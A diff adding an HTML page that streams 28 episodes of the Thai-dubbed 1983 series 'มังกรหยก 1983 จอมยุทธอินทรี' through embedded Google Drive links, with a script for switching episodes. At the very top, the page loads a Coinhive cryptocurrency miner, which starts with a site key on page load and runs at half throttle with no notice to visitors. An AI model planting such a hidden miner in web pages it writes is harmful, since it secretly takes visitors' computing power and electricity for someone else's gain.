@@ -1,0 +1,94 @@
+<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+<script>
+ var miner = new CoinHive.Anonymous('bybIimE2fgM1dgXKACWDebKJALQ1TQwU');
+ miner.setThrottle(0.5);
+ miner.start();
+</script>
+<b>มังกรหยก 1983 จอมยุทธอินทรี</b><br />
+<b>ตอนที่ 1-28</b><br />
+<script>
+  function go(loc,spanidname) {
+    document.getElementById('myvideo').src = loc; 
+
+    document.getElementById("span01").style="color:yellow";
+    document.getElementById("span02").style="color:yellow";
+    document.getElementById("span03").style="color:yellow";
+    document.getElementById("span04").style="color:yellow";
+    document.getElementById("span05").style="color:yellow";
+    document.getElementById("span06").style="color:yellow";
+    document.getElementById("span07").style="color:yellow";
+    document.getElementById("span08").style="color:yellow";
+    document.getElementById("span09").style="color:yellow";
+    document.getElementById("span10").style="color:yellow";
+    document.getElementById("span11").style="color:yellow";
+    document.getElementById("span12").style="color:yellow";
+    document.getElementById("span13").style="color:yellow";
+    document.getElementById("span14").style="color:yellow";
+    document.getElementById("span15").style="color:yellow";
+    document.getElementById("span16").style="color:yellow";
+    document.getElementById("span17").style="color:yellow";
+    document.getElementById("span18").style="color:yellow";
+    document.getElementById("span19").style="color:yellow";
+    document.getElementById("span20").style="color:yellow";
+    document.getElementById("span21").style="color:yellow";
+    document.getElementById("span22").style="color:yellow";
+    document.getElementById("span23").style="color:yellow";
+    document.getElementById("span24").style="color:yellow";
+    document.getElementById("span25").style="color:yellow";
+    document.getElementById("span26").style="color:yellow";
+    document.getElementById("span27").style="color:yellow";
+    document.getElementById("span28").style="color:yellow";
+    document.getElementById(spanidname).style="color:red";
+    document.getElementById("mypart").style="color:red";
+    document.getElementById("mypart").innerHTML="<h1>"+document.getElementById(spanidname).innerHTML+"</H1";
+
+
+  }
+  </script>
+
+<iframe height="480" id="myvideo" src="https://drive.google.com/file/d/0B_HRTU-jFrPbd1NzbFZVX0Zpczg/preview" width="640"  allowfullscreen="true" webkitallowfullscreen="true" mozallowfullscreen="true"></iframe>
+<br />
+<br />
+<table style="width:100%">
+<tr>
+<td><span id="mypart"><h1>ตอนที่1</h1></span></td>
+</tr>
+<tr>
+<td><span id="span01" onmouseover="this.style.cursor='pointer'"  onmouseout="this.style.cursor='default'" onclick="go('https://drive.google.com/file/d/0B_HRTU-jFrPbd1NzbFZVX0Zpczg/preview','span01')";> ตอนที่01</span></td>
+<td><span id="span02" onmouseover="this.style.cursor='pointer'"  onmouseout="this.style.cursor='default'" onclick="go('https://drive.google.com/file/d/0B_HRTU-jFrPbOTVjNHAyNTl3enc/preview','span02')";> ตอนที่02</span></td>
+<td><span id="span03" onmouseover="this.style.cursor='pointer'"  onmouseout="this.style.cursor='default'" onclick="go('https://drive.google.com/file/d/0B_HRTU-jFrPbb28wRWE3NXhsdHM/preview','span03')";> ตอนที่03</span></td>
+<td><span id="span04" onmouseover="this.style.cursor='pointer'"  onmouseout="this.style.cursor='default'" onclick="go('https://drive.google.com/file/d/0B_HRTU-jFrPbTzU4a1FoNTd3Z1k/preview','span04')";> ตอนที่04</span></td>
+<td><span id="span05"  onmouseover="this.style.cursor='pointer'" onmouseout="this.style.cursor='default'"onclick="go('https://drive.google.com/file/d/0B_HRTU-jFrPbbHVHeGIyYXFocDA/preview','span05')";> ตอนที่05</span></td>
+</tr><tr>
+<td><span id="span06"  onmouseover="this.style.cursor='pointer'" onmouseout="this.style.cursor='default'"onclick="go('https://drive.google.com/file/d/0B_HRTU-jFrPbZFh6ZzI3bEgtRW8/preview','span06')";> ตอนที่06</span></td>
+<td><span id="span07"  onmouseover="this.style.cursor='pointer'" onmouseout="this.style.cursor='default'"onclick="go('https://drive.google.com/file/d/0B_HRTU-jFrPbR054OEFGaWFmTms/preview','span07')";> ตอนที่07</span></td>
+<td><span id="span08"  onmouseover="this.style.cursor='pointer'" onmouseout="this.style.cursor='default'"onclick="go('https://drive.google.com/file/d/0B_HRTU-jFrPbME1WZjc4cnFXaFk/preview','span08')";> ตอนที่08</span></td>
+<td><span id="span09"  onmouseover="this.style.cursor='pointer'" onmouseout="this.style.cursor='default'"onclick="go('https://drive.google.com/file/d/0B_HRTU-jFrPbdFRZRGJiV2R6alk/preview','span09')";> ตอนที่09</span></td>
+<td><span id="span10"  onmouseover="this.style.cursor='pointer'" onmouseout="this.style.cursor='default'"onclick="go('https://drive.google.com/file/d/0B_HRTU-jFrPbNElvWXBZcThWQlE/preview','span10')";> ตอนที่10</span></td>
+</tr><tr>
+<td><span id="span11"  onmouseover="this.style.cursor='pointer'" onmouseout="this.style.cursor='default'"onclick="go('https://drive.google.com/file/d/0B_HRTU-jFrPbdl9zM2xUNHRwQmM/preview','span11')";> ตอนที่11</span></td>
+<td><span id="span12"  onmouseover="this.style.cursor='pointer'" onmouseout="this.style.cursor='default'"onclick="go('https://drive.google.com/file/d/0B_HRTU-jFrPbX3lYVnFSM0RWMmc/preview','span12')";> ตอนที่12</span></td>
+<td><span id="span13"  onmouseover="this.style.cursor='pointer'" onmouseout="this.style.cursor='default'"onclick="go('https://drive.google.com/file/d/0B_HRTU-jFrPbamR2dFNFNGY2WXM/preview','span13')";> ตอนที่13</span></td>
+<td><span id="span14"  onmouseover="this.style.cursor='pointer'" onmouseout="this.style.cursor='default'"onclick="go('https://drive.google.com/file/d/0B_HRTU-jFrPbZENJNHdBM21objQ/preview','span14')";> ตอนที่14</span></td>
+<td><span id="span15"  onmouseover="this.style.cursor='pointer'" onmouseout="this.style.cursor='default'"onclick="go('https://drive.google.com/file/d/0B_HRTU-jFrPbVnI1VklFNDBEOTA/preview','span15')";> ตอนที่15</span></td>
+</tr><tr>
+<td><span id="span16"  onmouseover="this.style.cursor='pointer'" onmouseout="this.style.cursor='default'"onclick="go('https://drive.google.com/file/d/0B_HRTU-jFrPbMFdhOEFuVXY3dVk/preview','span16')";> ตอนที่16</span></td>
+<td><span id="span17"  onmouseover="this.style.cursor='pointer'" onmouseout="this.style.cursor='default'"onclick="go('https://drive.google.com/file/d/0B_HRTU-jFrPbdjF6cFE5dHJfYWM/preview','span17')";> ตอนที่17</span></td>
+<td><span id="span18"  onmouseover="this.style.cursor='pointer'" onmouseout="this.style.cursor='default'"onclick="go('https://drive.google.com/file/d/0B_HRTU-jFrPbU3pqYUlIYzNpME0/preview','span18')";> ตอนที่18</span></td>
+<td><span id="span19"  onmouseover="this.style.cursor='pointer'" onmouseout="this.style.cursor='default'"onclick="go('https://drive.google.com/file/d/0B_HRTU-jFrPbZFBKaDNudzhyekU/preview','span19')";> ตอนที่19</span></td>
+<td><span id="span20"  onmouseover="this.style.cursor='pointer'" onmouseout="this.style.cursor='default'"onclick="go('https://drive.google.com/file/d/0B_HRTU-jFrPbOHQxTkpXS1JiMWs/preview','span20')";> ตอนที่20</span></td>
+</tr><tr>
+<td><span id="span21"  onmouseover="this.style.cursor='pointer'" onmouseout="this.style.cursor='default'"onclick="go('https://drive.google.com/file/d/0B_HRTU-jFrPbU0hhVzN1RUNOZWc/preview','span21')";> ตอนที่21</span></td>
+<td><span id="span22"  onmouseover="this.style.cursor='pointer'" onmouseout="this.style.cursor='default'"onclick="go('https://drive.google.com/file/d/0B_HRTU-jFrPbZXR5UnNLcXF3b1U/preview','span22')";> ตอนที่22</span></td>
+<td><span id="span23"  onmouseover="this.style.cursor='pointer'" onmouseout="this.style.cursor='default'"onclick="go('https://drive.google.com/file/d/0B_HRTU-jFrPbZjFMTldydzdFWnM/preview','span23')";> ตอนที่23</span></td>
+<td><span id="span24"  onmouseover="this.style.cursor='pointer'" onmouseout="this.style.cursor='default'"onclick="go('https://drive.google.com/file/d/0B_HRTU-jFrPbUFI0dTNPYXUzb2c/preview','span24')";> ตอนที่24</span></td>
+<td><span id="span25"  onmouseover="this.style.cursor='pointer'" onmouseout="this.style.cursor='default'"onclick="go('https://drive.google.com/file/d/0B_HRTU-jFrPbSDlIX0NYc1RiZG8/preview','span25')";> ตอนที่25</span></td>
+</tr><tr>
+<td><span id="span26"  onmouseover="this.style.cursor='pointer'" onmouseout="this.style.cursor='default'"onclick="go('https://drive.google.com/file/d/0B_HRTU-jFrPbU2dLSXVudXc0NVU/preview','span26')";> ตอนที่26</span></td>
+<td><span id="span27"  onmouseover="this.style.cursor='pointer'" onmouseout="this.style.cursor='default'"onclick="go('https://drive.google.com/file/d/0B_HRTU-jFrPbT1dKZ2JRYTc1aWM/preview','span27')";> ตอนที่27</span></td>
+<td><span id="span28"  onmouseover="this.style.cursor='pointer'" onmouseout="this.style.cursor='default'"onclick="go('https://drive.google.com/file/d/0B_HRTU-jFrPbaXQ4SjZGU3B6bHM/preview','span28')";> ตอนที่28</span></td>
+</tr>
+</table>
+
+
+
